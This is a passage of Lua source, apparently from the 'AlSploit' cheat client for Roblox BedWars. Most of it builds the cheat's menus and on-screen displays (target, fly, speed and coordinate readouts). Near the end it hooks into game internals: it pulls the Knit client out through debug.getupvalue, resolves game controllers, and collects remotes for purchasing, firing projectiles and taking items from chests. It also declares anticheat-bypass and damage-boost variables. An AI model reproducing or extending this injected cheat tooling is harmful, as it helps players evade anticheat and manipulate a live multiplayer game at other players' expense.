			DropdownText.Font = Enum.Font.GothamBold
			DropdownText.Text = Name

			UITextSizeConstraint_4.Parent = DropdownText
			UITextSizeConstraint_4.Name = "UITextSizeConstraint_4"

			UITextSizeConstraint_4.MaxTextSize = 12

			UIPadding_2.Parent = DropdownText
			UIPadding_2.Name = "UIPadding_2"

			UIPadding_2.PaddingLeft = UDim.new(0, 15)

			ModuleInformation_2.Parent = AlSploitScreenGui
			ModuleInformation_2.Name = "ModuleInformation"

			ModuleInformation_2.BackgroundColor3 = Color3.new(0.101961, 0.101961, 0.101961)
			ModuleInformation_2.BorderSizePixel = 0
			ModuleInformation_2.AnchorPoint = Vector2.new(0, 0.3)
			ModuleInformation_2.TextColor3 = Color3.new(1, 1, 1)
			ModuleInformation_2.TextScaled = true
			ModuleInformation_2.TextSize = 11
			ModuleInformation_2.Visible = false
			ModuleInformation_2.ZIndex = 5
			ModuleInformation_2.Size = UDim2.new(1.11, 0, 0.131, 0)
			ModuleInformation_2.Font = Enum.Font.GothamBold
			ModuleInformation_2.Text = HoverText_2

			local TextSize = TextService:GetTextSize(HoverText_2, 11, Enum.Font.GothamBold, Vector2.new(100000, 100000))

			ModuleInformation_2.Size = UDim2.new(0, (TextSize.X + 15), 0, (TextSize.Y + 4))

			UICorner_3.Parent = ModuleInformation_2
			UICorner_3.Name = "UICorner_2"

			UICorner_3.CornerRadius = UDim.new(0.4, 0)

			UITextSizeConstraint_5.Parent = ModuleInformation_2
			UITextSizeConstraint_5.Name = "UITextSizeConstraint_3"

			UITextSizeConstraint_5.MaxTextSize = 11

			task.spawn(function()
				local FollowMouseValue = false

				task.spawn(function()
					Dropdown.MouseLeave:Connect(function()
						ModuleInformation_2.Visible = false

						FollowMouseValue = false
					end)
				end)

				task.spawn(function()
					Dropdown.MouseEnter:Connect(function()
						ModuleInformation_2.Visible = true

						FollowMouseValue = true
					end)
				end)

				task.spawn(function()
					Mouse.Move:Connect(function()
						if FollowMouseValue == true then
							local MousePosition = UserInputService:GetMouseLocation()

							ModuleInformation_2.Position = UDim2.new(0, MousePosition.X , 0, MousePosition.Y - 10)
						end
					end)
				end)
			end)

			task.spawn(function()
				DropdownButton.Activated:Connect(function()
					Dropdown.Visible = not Dropdown.Visible
				end)
			end)

			function DropdownTable:CreateToggle(Arguments)
				local DefaultValue = Arguments.DefaultValue
				local Function_2 = Arguments.Function
				local Parent_2 = Name
				local Name = Arguments.Name

				local Button = Instance.new("TextButton")
				local UITextSizeConstraint_6 = Instance.new("UITextSizeConstraint")

				if AlSploitSettings[Parent][Parent_2][Name] == nil then
					AlSploitSettings[Parent][Parent_2][Name] = {Value = DefaultValue}
				end

				local function ToggleValue(Start)
					if Start == false then
						AlSploitSettings[Parent][Parent_2][Name].Value = not AlSploitSettings[Parent][Parent_2][Name].Value
					end

					if AlSploitSettings[Parent][Parent_2][Name].Value == true then
						Button.BackgroundTransparency = 0

						Function_2()
					end

					if AlSploitSettings[Parent][Parent_2][Name].Value == false then
						Button.BackgroundTransparency = 1

						Function_2()
					end
				end

				Button.Parent = OptionsContainer
				Button.Name = "Button"

				Button.BackgroundTransparency = (AlSploitSettings[Parent][Parent_2][Name].Value == true and 0 or 1)
				Button.BackgroundColor3 = Color3.new(0.564706, 0.0313725, 1)
				Button.AutoButtonColor = false
				Button.BorderSizePixel = 0
				Button.TextColor3 = Color3.new(1, 1, 1)
				Button.TextScaled = true
				Button.TextSize = 11
				Button.Position = UDim2.new(3.039, 0, -2.333, 0)
				Button.Size = UDim2.new(1, 0, 0.172, 0)
				Button.Font = Enum.Font.GothamBold
				Button.Text = Name		

				UITextSizeConstraint_6.Parent = Button
				UITextSizeConstraint_6.Name = "UITextSizeConstraint_5"

				UITextSizeConstraint_6.MaxTextSize = 11

				task.spawn(function()
					ToggleValue(true)
				end)

				task.spawn(function()
					Button.Activated:Connect(function()
						ToggleValue(false)
					end)
				end)
			end

			return DropdownTable
		end

		function ToggleTable:CreateColorSlider(Arguments)
			local DefaultValue = Arguments.DefaultValue
			local Function = Arguments.Function
			local Parent = Name
			local Name = Arguments.Name

			if AlSploitSettings[Parent][Name] == nil then
				AlSploitSettings[Parent][Name] = {Value = tostring(DefaultValue.R .. "," .. DefaultValue.G .. "," .. DefaultValue.B), Percentage = 0}
			end

			local ColorSplit = string.split(AlSploitSettings[Parent][Name].Value, ",")

			local R = ColorSplit[1]
			local G = ColorSplit[2]
			local B = ColorSplit[3]

			local ColorPicker = Instance.new("Frame")

			local SliderFrame = Instance.new("Frame")

			local Bar = Instance.new("TextButton")
			local UICorner_3 = Instance.new("UICorner")
			local UIStroke = Instance.new("UIStroke")
			local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")

			local ColorDisplay = Instance.new("Frame")
			local UICorner_4 = Instance.new("UICorner")

			local Fill = Instance.new("Frame")
			local UIGradient = Instance.new("UIGradient")

			local NameDisplay = Instance.new("TextLabel")
			local UITextSizeConstraint_5 = Instance.new("UITextSizeConstraint")
			local UIPadding_2 = Instance.new("UIPadding")

			ColorPicker.Parent = ModuleContainer
			ColorPicker.Name = "ColorPicker"

			ColorPicker.BackgroundTransparency = 0.15
			ColorPicker.BackgroundColor3 = Color3.new(0, 0, 0)
			ColorPicker.BorderSizePixel = 0
			ColorPicker.Position = UDim2.new(0, 0, 0.287, 0)
			ColorPicker.Visible = false
			ColorPicker.Size = UDim2.new(1, 0, 0.099, 0)

			ColorPicker.LayoutOrder = CurrentLayoutOrder
			ColorPicker.LayoutOrder = (CurrentLayoutOrder + 1)

			SliderFrame.Parent = ColorPicker
			SliderFrame.Name = "SliderFrame"

			SliderFrame.BackgroundTransparency = 1
			SliderFrame.BorderSizePixel = 0
			SliderFrame.Position = UDim2.new(0.150, 0, 0.654, 0)
			SliderFrame.Size = UDim2.new(0.700, 0, 0.060, 0)

			Bar.Parent = SliderFrame
			Bar.Name = "Bar"

			Bar.BackgroundColor3 = Color3.new(0, 0.6, 1)
			Bar.AutoButtonColor = false
			Bar.BorderSizePixel = 0
			Bar.TextScaled = true
			Bar.TextSize = 14
			Bar.Position = UDim2.new(AlSploitSettings[Parent][Name].Percentage, 0, -1.111, 0)
			Bar.ZIndex = 2
			Bar.Size = UDim2.new(0.070, 0, 1.915, 0)
			Bar.Font = Enum.Font.GothamBold
			Bar.Text = ""

			UICorner_3.Parent = Bar
			UICorner_3.Name = "UICorner_3"

			UICorner_3.CornerRadius = UDim.new(1, 0)

			UIStroke.Parent = Bar
			UIStroke.Name = "UIStroke"

			UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
			UIStroke.Thickness = 1
			UIStroke.Color = Color3.new(0, 0, 0)

			UITextSizeConstraint_4.Parent = Bar
			UITextSizeConstraint_4.Name = "UITextSizeConstraint_4"

			UITextSizeConstraint_4.MaxTextSize = 14

			ColorDisplay.Parent = SliderFrame
			ColorDisplay.Name = "ColorDisplay"

			ColorDisplay.BackgroundColor3 = Color3.new(R, G, B)
			ColorDisplay.BorderSizePixel = 0
			ColorDisplay.Position = UDim2.new(0.889, 0, -5, 0)
			ColorDisplay.Size = UDim2.new(0, 15, 0, 15)

			UICorner_4.Parent = ColorDisplay
			UICorner_4.Name = "UICorner_4"

			UICorner_4.CornerRadius = UDim.new(0.200, 0)

			Fill.Parent = SliderFrame
			Fill.Name = "Fill"

			Fill.BackgroundColor3 = Color3.new(1, 1, 1)
			Fill.BorderSizePixel = 0
			Fill.Position = UDim2.new(0, 0, -0.329, 0)
			Fill.Size = UDim2.new(1, 0, 0.650, 0)

			UIGradient.Parent = Fill
			UIGradient.Name = "UIGradient_3"

			UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0, 0)), ColorSequenceKeypoint.new(0.20, Color3.new(1, 1, 0)), ColorSequenceKeypoint.new(0.40, Color3.new(0, 1, 0)), ColorSequenceKeypoint.new(0.60, Color3.new(0, 1, 1)), ColorSequenceKeypoint.new(0.80, Color3.new(0, 0, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0, 1))}

			NameDisplay.Parent = ColorPicker
			NameDisplay.Name = "NameDisplay"

			NameDisplay.BackgroundTransparency = 1
			NameDisplay.BorderSizePixel = 0
			NameDisplay.TextXAlignment = Enum.TextXAlignment.Left
			NameDisplay.TextColor3 = Color3.new(1, 1, 1)
			NameDisplay.TextScaled = true
			NameDisplay.TextSize = 10
			NameDisplay.Position = UDim2.new(-0.005, 0, 0.198, 0)
			NameDisplay.Size = UDim2.new(1.005, 0, 0.470, 0)
			NameDisplay.Font = Enum.Font.GothamBold
			NameDisplay.Text = Name

			UITextSizeConstraint_5.Parent = NameDisplay
			UITextSizeConstraint_5.Name = "UITextSizeConstraint_5"

			UITextSizeConstraint_5.MaxTextSize = 11

			UIPadding_2.Parent = NameDisplay
			UIPadding_2.Name = "UIPadding_2"

			UIPadding_2.PaddingLeft = UDim.new(0, 30)

			local function GetColor(Percentage)
				local UIGradientKeyPoints = UIGradient.Color.Keypoints

				local ClosestToRight = UIGradientKeyPoints[# UIGradientKeyPoints]
				local ClosestToLeft = UIGradientKeyPoints[1]

				local Color

				for i = 1, (# UIGradientKeyPoints - 1) do
					if (UIGradientKeyPoints[i].Time <= Percentage) and (UIGradientKeyPoints[i + 1].Time >= Percentage) then
						ClosestToRight = UIGradientKeyPoints[i + 1]
						ClosestToLeft = UIGradientKeyPoints[i]

						Percentage = ((Percentage - ClosestToLeft.Time) / (ClosestToRight.Time - ClosestToLeft.Time))
						Color = ClosestToLeft.Value:lerp(ClosestToRight.Value, Percentage)

						return Color
					end
				end
			end

			local CanUseSlider = false

			task.spawn(function()
				Bar.MouseButton1Down:Connect(function()
					CanUseSlider = true
				end)				
			end)

			task.spawn(function()
				UserInputService.InputEnded:Connect(function(Input)
					if Input.UserInputType == Enum.UserInputType.MouseButton1 then
						CanUseSlider = false
					end
				end)
			end)

			task.spawn(function()
				Function(R, G, B)
			end)

			task.spawn(function()
				DropdownButton.Activated:Connect(function()
					ColorPicker.Visible = not ColorPicker.Visible

					task.spawn(function()
						repeat
							task.wait()

							if CanUseSlider == true then
								local MousePosition = UserInputService:GetMouseLocation().X
								local FramePosition = ColorPicker.AbsolutePosition.X
								local BarPosition = Bar.Position
								local FrameSize = ColorPicker.AbsoluteSize.X

								local Position = ((MousePosition - FramePosition) / FrameSize)
								local Percentage = math.clamp(Position, 0, 1)

								local TweenInformation = TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false, 0)
								local PositionTween = TweenService:Create(Bar, TweenInformation, {Position = UDim2.new(Percentage, 0, BarPosition.Y.Scale, 0)})

								PositionTween:Play()								

								local Color = GetColor(Percentage)

								ColorDisplay.BackgroundColor3 = Color

								AlSploitSettings[Parent][Name].Percentage = Percentage
								AlSploitSettings[Parent][Name].Value = tostring(Color.R .. "," .. Color.G .. "," .. Color.B)

								Function()
							end					
						until shared.AlSploitUnInjected == true or ColorPicker.Visible == false
					end)
				end)
			end)
		end

		task.spawn(function()
			ToggleTable:CreateKeybind()
		end)

		return ToggleTable, Toggle
	end

	return TabTable
end

function CreateNotification(NotificationTime, NotificationText)
	NotificationCount = NotificationCount + 1

	local Notification = Instance.new("Frame")

	Notification.Parent = AlSploitScreenGui
	Notification.Name = "Notification"
	Notification.BackgroundTransparency = 0.15
	Notification.BackgroundColor3 = Color3.new(0, 0, 0)
	Notification.Position = UDim2.new(1, 0, NotificationY, 0)
	Notification.Size = UDim2.new(0.178, 0, 0.084, 0)

	table.insert(NotificationInstances, Notification)

	local UICorner = Instance.new("UICorner")

	UICorner.Parent = Notification
	UICorner.CornerRadius = UDim.new(0.06, 0)

	local UIStroke = Instance.new("UIStroke")

	UIStroke.Parent = Notification
	UIStroke.Transparency = 0.5

	local Slider = Instance.new("Frame")

	Slider.Parent = Notification
	Slider.Name = "Slider"
	Slider.BackgroundColor3 = Color3.new(0, 0, 0)
	Slider.BorderSizePixel = 0
	Slider.Position = UDim2.new(0.219, 0, 0.734, 0)
	Slider.Size = UDim2.new(0.631, 0, 0.058, 0)

	local UICorner2 = Instance.new("UICorner")

	UICorner2.Parent = Slider
	UICorner2.Name = "UICorner2"
	UICorner2.CornerRadius = UDim.new(1, 0)

	local Fill = Instance.new("Frame")

	Fill.Parent = Slider
	Fill.Name = "Fill"
	Fill.BackgroundColor3 = Color3.new(0.45098, 0, 1)
	Fill.BorderSizePixel = 0
	Fill.Size = UDim2.new(1, 0, 1, 0)

	local Text = Instance.new("TextLabel")

	Text.Parent = Notification
	Text.Name = "Text"
	Text.BackgroundTransparency = 1
	Text.TextColor3 = Color3.new(1, 1, 1)
	Text.TextScaled = true
	Text.Position = UDim2.new(0, 0, 0.1, 0)
	Text.Font = Enum.Font.GothamBold
	Text.Size = UDim2.new(1, 0, 0.47, 0)
	Text.Text = NotificationText

	local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

	UITextSizeConstraint.Parent = Text
	UITextSizeConstraint.MaxTextSize = 14

	local TimeLeft = Instance.new("TextLabel")

	TimeLeft.Parent = Notification
	TimeLeft.Name = "TimeLeft"
	TimeLeft.BackgroundTransparency = 1
	TimeLeft.TextColor3 = Color3.new(1, 1, 1)
	TimeLeft.TextScaled = true
	TimeLeft.Position = UDim2.new(0, 0, 0.53, 0)
	TimeLeft.Font = Enum.Font.GothamBold
	TimeLeft.Size = UDim2.new(0.221, 0, 0.47, 0)
	TimeLeft.Text = tostring(NotificationTime)

	local UITextSizeConstraint2 = Instance.new("UITextSizeConstraint")

	UITextSizeConstraint2.Parent = TimeLeft
	UITextSizeConstraint2.Name = "UITextSizeConstraint2"
	UITextSizeConstraint2.MaxTextSize = 14

	task.spawn(function()
		local DesiredPosition = UDim2.new(0.81, 0, NotificationY, 0)

		NotificationY = NotificationY - 0.105

		local TweenInformation = TweenInfo.new(0.3, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out, 0, false, 0)
		local PositionTween = TweenService:Create(Notification, TweenInformation, {Position = DesiredPosition})
		PositionTween:Play()

		task.wait(NotificationTime)

		DesiredPosition = UDim2.new(1, 0, Notification.Position.Y.Scale, 0)

		TweenInformation = TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
		PositionTween = TweenService:Create(Notification, TweenInformation, {Position = DesiredPosition})

		NotificationY = NotificationY + 0.105

		PositionTween:Play()

		NotificationEvent:Fire({Name = "NotificationRemoved", Position = DesiredPosition})
		NotificationCount = NotificationCount - 1

		task.wait(TweenInformation.Time)

		for i, v in next, NotificationInstances do
			if v == Notification then
				table.remove(NotificationInstances, i)

				Notification:Destroy()

				break
			end
		end
	end)

	task.spawn(function()
		local TimeleftTick = tick()

		repeat
			task.wait()

			TimeLeft.Text = string.format("%.1f", (NotificationTime - (tick() - TimeleftTick)))
		until (tick() - TimeleftTick) >= NotificationTime

		TimeLeft.Text = "0.0"
	end)

	local TweenInformation = TweenInfo.new(NotificationTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, false, 0)
	local SizeTween = TweenService:Create(Fill, TweenInformation, {Size = UDim2.new(0, 0, 1, 0)})

	SizeTween:Play()
end

local function CreateProgressHud(MaximumValue)
	local Background = Instance.new("Frame")
	local UICorner = Instance.new("UICorner")
	local UIStroke = Instance.new("UIStroke")

	local Text = Instance.new("TextLabel")
	local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

	local DisplayBackground = Instance.new("Frame")
	local UICorner_2 = Instance.new("UICorner")

	local Display = Instance.new("Frame")

	local UICorner_3 = Instance.new("UICorner")

	Background.Parent = AlSploitScreenGui
	Background.Name = "Background"

	Background.BackgroundTransparency = 0.25
	Background.BackgroundColor3 = Color3.new(0, 0, 0)
	Background.BorderSizePixel = 0
	Background.Position = UDim2.new(0.410, 0, 0.698, 0)
	Background.Size = UDim2.new(0.178, 0, 0.085, 0)

	UICorner.Parent = Background
	UICorner.Name = "UICorner"

	UICorner.CornerRadius = UDim.new(0.1, 0)

	UIStroke.Parent = Background
	UIStroke.Name = "UIStroke"

	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	UIStroke.Thickness = 2
	UIStroke.Color = Color3.new(0, 0.6, 1)

	Text.Parent = Background
	Text.Name = "Text"

	Text.BackgroundTransparency = 1
	Text.BorderSizePixel = 0
	Text.Position = UDim2.new(0, 0, 0.510, 0)
	Text.TextColor3 = Color3.new(0, 0.6, 1)
	Text.TextScaled = true
	Text.TextSize = 20
	Text.Size = UDim2.new(1, 0, 0.489, 0)
	Text.Font = Enum.Font.GothamBold
	Text.Text = MaximumValue

	UITextSizeConstraint.Parent = Text
	UITextSizeConstraint.Name = "UITextSizeConstraint"

	UITextSizeConstraint.MaxTextSize = 20

	DisplayBackground.Parent = Background
	DisplayBackground.Name = "DisplayBackground"

	DisplayBackground.BackgroundColor3 = Color3.new(0, 0, 0)
	DisplayBackground.BorderSizePixel = 0
	DisplayBackground.Position = UDim2.new(0.229, 0, 0.267, 0)
	DisplayBackground.Size = UDim2.new(0.545, 0, 0.150, 0)

	UICorner_2.Parent = DisplayBackground
	UICorner_2.Name = "UICorner_2"

	UICorner_2.CornerRadius = UDim.new(0.4, 0)

	Display.Parent = DisplayBackground
	Display.Name = "Display"

	Display.BackgroundColor3 = Color3.new(0, 0.6, 1)
	Display.BorderSizePixel = 0
	Display.Position = UDim2.new(0, 0, 0, 0)
	Display.ZIndex = 2
	Display.Size = UDim2.new(1, 0, 1, 0)

	UICorner_3.Parent = Display
	UICorner_3.Name = "UICorner_3"

	UICorner_3.CornerRadius = UDim.new(0.4, 0)

	task.spawn(function()
		local TweenInformation = TweenInfo.new(MaximumValue, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
		local SizeTween = TweenService:Create(Display, TweenInformation, {Size = UDim2.new(0, 0, 1, 0)})

		SizeTween:Play()

		SizeTween.Completed:Connect(function()
			Background:Destroy()
		end)
	end)

	task.spawn(function()
		repeat
			task.wait()

			local Percentage = math.clamp(Display.Size.X.Scale, 0, 1)
			local RoundedValue = DecimalRound((Percentage * MaximumValue), 1)

			Text.Text = RoundedValue
		until shared.AlSploitUnInjected == true or not Background
	end)

	return Background
end

local function CreateTargetHud()
	local Background = Instance.new("Frame")
	local UICorner = Instance.new("UICorner")
	local UIStroke = Instance.new("UIStroke")

	local DisplayBackground = Instance.new("Frame")
	local UICorner_2 = Instance.new("UICorner")

	local Display = Instance.new("Frame")
	local UICorner_3 = Instance.new("UICorner")

	local PlayerName = Instance.new("TextLabel")

	local Health = Instance.new("TextLabel")

	local _100HP = Instance.new("TextLabel")

	local Status = Instance.new("TextLabel")

	Background.Parent = AlSploitScreenGui
	Background.Name = "Background"

	Background.BackgroundTransparency = 0.25
	Background.BackgroundColor3 = Color3.new(0, 0, 0)
	Background.BorderSizePixel = 0
	Background.Position = UDim2.new(0.397, 0, 0.576, 0)
	Background.Size = UDim2.new(0.2, 0, 0.116, 0)

	UICorner.Parent = Background
	UICorner.Name = "UICorner"

	UICorner.CornerRadius = UDim.new(0.09, 0)

	UIStroke.Parent = Background
	UIStroke.Name = "UIStroke"

	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	UIStroke.Thickness = 2

	DisplayBackground.Parent = Background
	DisplayBackground.Name = "DisplayBackground"

	DisplayBackground.BackgroundColor3 = Color3.new(0, 0, 0)
	DisplayBackground.BorderSizePixel = 0
	DisplayBackground.Position = UDim2.new(0.226, 0, 0.825, 0)
	DisplayBackground.Size = UDim2.new(0.545, 0, 0.0729, 0)

	UICorner_2.Parent = DisplayBackground
	UICorner_2.Name = "UICorner_2"

	UICorner_2.CornerRadius = UDim.new(0.015, 0)

	Display.Parent = DisplayBackground
	Display.Name = "Display"

	Display.BorderSizePixel = 0
	Display.Position = UDim2.new(0, 0, 0, 0)
	Display.Size = UDim2.new(1, 0, 1, 0)

	Display.ZIndex = 2

	UICorner_3.Parent = Display
	UICorner_3.Name = "UICorner3"

	UICorner_3.CornerRadius = UDim.new(0, 6)

	PlayerName.Parent = Background
	PlayerName.Name = "PlayerName"

	PlayerName.BackgroundTransparency = 1
	PlayerName.BackgroundColor3 = Color3.new(1, 1, 1)
	PlayerName.BorderSizePixel = 0
	PlayerName.TextColor3 = Color3.new(0, 0.6, 1)
	PlayerName.Position = UDim2.new(0, 0, 0, 0)
	PlayerName.TextSize = 18
	PlayerName.Size = UDim2.new(1, 0, 0.480, 0)
	PlayerName.Font = Enum.Font.GothamBold
	PlayerName.Text = ""

	Health.Parent = Background
	Health.Name = "Health"

	Health.BackgroundTransparency = 1
	Health.BackgroundColor3 = Color3.new(1, 1, 1)
	Health.BorderSizePixel = 0
	Health.Position = UDim2.new(0, 0, 0.471, 0)
	Health.TextColor3 = Color3.new(0, 0.6, 1)
	Health.TextSize = 15
	Health.Size = UDim2.new(1, 0, 0.354, 0)
	Health.Font = Enum.Font.GothamBold
	Health.Text = "Health: 100"

	_100HP.Parent = Background
	_100HP.Name = "100HP"

	_100HP.BackgroundTransparency = 1
	_100HP.BackgroundColor3 = Color3.new(1, 1, 1)
	_100HP.BorderSizePixel = 0
	_100HP.Position = UDim2.new(0.770, 0, 0.725, 0)
	_100HP.TextColor3 = Color3.new(0, 0.6, 1)
	_100HP.TextSize = 15
	_100HP.Size = UDim2.new(0.230, 0, 0.249, 0)
	_100HP.Font = Enum.Font.GothamBold
	_100HP.Text = "100 HP"

	Status.Parent = Background
	Status.Name = "Status"

	Status.BackgroundTransparency = 1
	Status.BackgroundColor3 = Color3.new(1, 1, 1)
	Status.BorderSizePixel = 0
	Status.Position = UDim2.new(0, 0, 0.725, 0)
	Status.TextColor3 = Color3.new(0, 1, 0)
	Status.TextSize = 15
	Status.Size = UDim2.new(0.228, 0, 0.249, 0)
	Status.Font = Enum.Font.GothamBold
	Status.Text = "Win"

	return Background, UIStroke, PlayerName, Display, Health, _100HP, Status
end

local function CreateFlyHud()
	local Background = Instance.new("Frame")

	local UICorner = Instance.new("UICorner")
	local UIStroke = Instance.new("UIStroke")

	local Text = Instance.new("TextLabel")
	local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

	local DisplayBackground = Instance.new("Frame")
	local UICorner_2 = Instance.new("UICorner")

	local Display = Instance.new("Frame")
	local UICorner_3 = Instance.new("UICorner")

	Background.Parent = AlSploitScreenGui
	Background.Name = "Background"

	Background.BackgroundTransparency = 0.25
	Background.BackgroundColor3 = Color3.new(0, 0, 0)
	Background.BorderSizePixel = 0
	Background.Position = UDim2.new(0.41, 0, 0.7, 0)
	Background.Visible = false
	Background.Size = UDim2.new(0.178, 0, 0.085, 0)

	UICorner.Parent = Background
	UIStroke.Name = "UICorner"

	UICorner.CornerRadius = UDim.new(0.1, 0)

	UIStroke.Parent = Background
	UIStroke.Name = "UIStroke"

	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	UIStroke.Thickness = 2

	Text.Parent = Background
	Text.Name = "Text"

	Text.BackgroundTransparency = 1
	Text.BackgroundColor3 = Color3.new(1, 1, 1)
	Text.TextColor3 = Color3.new(0, 0.6, 1)
	Text.TextScaled = true
	Text.Position = UDim2.new(0, 0, 0.511, 0)
	Text.TextSize = 20
	Text.Size = UDim2.new(1, 0, 0.489, 0)
	Text.Font = Enum.Font.GothamBold

	UITextSizeConstraint.Parent = Text
	UITextSizeConstraint.Name = "UITextSizeConstraint"

	UITextSizeConstraint.MaxTextSize = 20

	DisplayBackground.Parent = Background
	DisplayBackground.Name = "DisplayBackground"

	DisplayBackground.BackgroundColor3 = Color3.new(0, 0, 0)
	DisplayBackground.BorderSizePixel = 0
	DisplayBackground.Position = UDim2.new(0.229, 0, 0.267, 0)
	DisplayBackground.Size = UDim2.new(0.545, 0, 0.150, 0)

	UICorner_2.Parent = DisplayBackground
	UICorner_2.Name = "UICorner_2"

	UICorner_2.CornerRadius = UDim.new(0.1, 6)

	Display.Parent = DisplayBackground
	Display.Name = "Display"

	Display.BackgroundColor3 = Color3.new(0, 0.6, 1)
	Display.BorderColor3 = Color3.new(0, 0, 0)
	Display.Position = UDim2.new(0, 0, 0, 0)
	Display.Size = UDim2.new(0, 0, 1, 0)

	UICorner_3.Parent = Display
	UICorner_3.Name = "UICorner_3"

	UICorner_3.CornerRadius = UDim.new(0.1, 6)

	return Background, Text, Display, UIStroke
end

local function CreateCoordinatesDisplay()
	local Text = Instance.new("TextLabel")

	Text.Parent = AlSploitScreenGui
	Text.Name = "Text"

	Text.BackgroundTransparency = 1
	Text.TextTransparency = 1
	Text.BorderSizePixel = 0
	Text.TextColor3 = Color3.new(1, 1, 1)
	Text.TextSize = 20
	Text.Position = UDim2.new(0.038, 0, 0.896, 0)
	Text.Size = UDim2.new(0.135, 0, 0.061, 0)
	Text.Font = Enum.Font.GothamBold
	Text.Text = "XYZ: (Nan, Nan, Nan)"

	return Text
end

local function CreateSpeedDisplay()
	local Text = Instance.new("TextLabel")

	Text.Parent = AlSploitScreenGui
	Text.Name = "Text"

	Text.BackgroundTransparency = 1
	Text.TextTransparency = 1
	Text.BorderSizePixel = 0
	Text.TextColor3 = Color3.new(1, 1, 1)
	Text.TextSize = 20
	Text.Position = UDim2.new(0.038, 0, 0.857, 0)
	Text.Size = UDim2.new(0.135, 0, 0.061, 0)
	Text.Font = Enum.Font.GothamBold
	Text.Text = "Speed: Nan"

	return Text
end

local ViewModel = Camera:WaitForChild("Viewmodel", 3)

local C1 = ViewModel:WaitForChild("RightHand"):WaitForChild("RightWrist").C1
local C0 = ViewModel:WaitForChild("RightHand"):WaitForChild("RightWrist").C0

local CollectionServiceBlocks = CollectionService:GetTagged("block")

local ScytheAnticheatDisabledSpeed = 0
local ScytheAnticheatDisabled = false
--local PacketDisablerSpeed = 0
local AnticheatBypassing = false
local DamageBoostValue = false
local JadeHammerTick = 0
local ZephyrOrb = 0

local Sides = {
	Enum.NormalId.Top, 
	Enum.NormalId.Left,
	Enum.NormalId.Right,
	Enum.NormalId.Back,
	Enum.NormalId.Front
}

local KnitClient;

for i = 1, 100 do 
	local success, client = pcall(function()
		local lib = require(LocalPlayer.PlayerScripts.TS.knit);
		return debug.getupvalue(lib.setup, i);
	end);
	if success and typeof(client) == 'table' and rawget(client, 'Controllers') then 
		KnitClient = client;
		break;
	end;
end;

local Flamework = require(ReplicatedStorageService["rbxts_include"]["node_modules"]["@flamework"].core.out).Flamework

local ClientStore = require(LocalPlayer.PlayerScripts.TS.ui.store).ClientStore
local Client = require(ReplicatedStorageService.TS.remotes).default.Client

local EquippedKit = ClientStore:getState().Bedwars.kit

local LocalPlayerInventory

task.spawn(function()
	local e = false
	repeat
		task.wait()

		if IsAlive(LocalPlayer) == true then
			pcall(function()
				LocalPlayerInventory = LocalPlayer.Character.InventoryFolder.Value

				if e == false then
					e = true

					for i, v in next, LocalPlayerInventory do
						print(i, v)
					end
				end
			end)
		end
	until IsAlive(LocalPlayer) == false
end)

local DefaultRemotePath = ReplicatedStorageService:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged")

local BedwarsControllers = {
	DamageIndicatorController = KnitClient.Controllers.DamageIndicatorController.spawnDamageIndicator,
	KnitViewModelController = KnitClient.Controllers.ViewmodelController,
	ViewModelController = LocalPlayer.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"],
	AbilityController = Flamework.resolveDependency("@easy-games/game-core:client/controllers/ability/ability-controller@AbilityController"),
	ZephyrController = KnitClient.Controllers.WindWalkerController,
	SprintController = KnitClient.Controllers.SprintController,
	BlockController = require(ReplicatedStorageService["rbxts_include"]["node_modules"]["@easy-games"]["block-engine"].out).BlockEngine,
	SwordController = KnitClient.Controllers.SwordController,
	QueueController = KnitClient.Controllers.QueueController,
	FovController = KnitClient.Controllers.FovController
}

local BedwarsMetaGames = {
	ProjectileMeta = require(ReplicatedStorageService.TS.projectile["projectile-meta"]).ProjectileMeta,
	ItemMeta = debug.getupvalue(require(ReplicatedStorageService.TS.item['item-meta']).getItemMeta, 1)
}

local BedwarsConstants = {
	CombatConstant = require(ReplicatedStorageService.TS.combat["combat-constant"]).CombatConstant,
	CPSConstants = require(ReplicatedStorageService.TS["shared-constants"]).CpsConstants
}

local BedwarsModules = {
	ControlModule = require(game.Players.LocalPlayer.PlayerScripts.PlayerModule).controls
}

local BedwarsRemotes = {
	SummonerClawAttackRequestRemote = DefaultRemotePath:WaitForChild("SummonerClawAttackRequest"),
	CollectCollectableEntityRemote = DefaultRemotePath:WaitForChild("CollectCollectableEntity"),
	DestroyPetrifiedPlayerRemote = DefaultRemotePath:WaitForChild("DestroyPetrifiedPlayer"),
	BedwarsPurchaseItemRemote = DefaultRemotePath:WaitForChild("BedwarsPurchaseItem"),
	HannahPromptTriggerRemote = DefaultRemotePath:WaitForChild("HannahPromptTrigger"),
	TrinitySetAngelTypeRemote = DefaultRemotePath:WaitForChild("SetAngelType"),
	SetObservedChestRemote = DefaultRemotePath:WaitForChild("Inventory/SetObservedChest"),
	HellBladeReleaseRemote = DefaultRemotePath:WaitForChild("HellBladeRelease"),
	AttemptCardThrowRemote = DefaultRemotePath:WaitForChild("AttemptCardThrow"),
	ResetCharacterRemote = DefaultRemotePath:WaitForChild("ResetCharacter"),
	ProjectileFireRemote = DefaultRemotePath:WaitForChild("ProjectileFire"),
	ConsumeTreeOrbRemote = DefaultRemotePath:WaitForChild("ConsumeTreeOrb"),
	PickupItemDropRemote = DefaultRemotePath:WaitForChild("PickupItemDrop"),
	SkyScytheSpinRemote = DefaultRemotePath:WaitForChild("SkyScytheSpin"),
	ChestGetItemRemote =  DefaultRemotePath:WaitForChild("Inventory/ChestGetItem"),
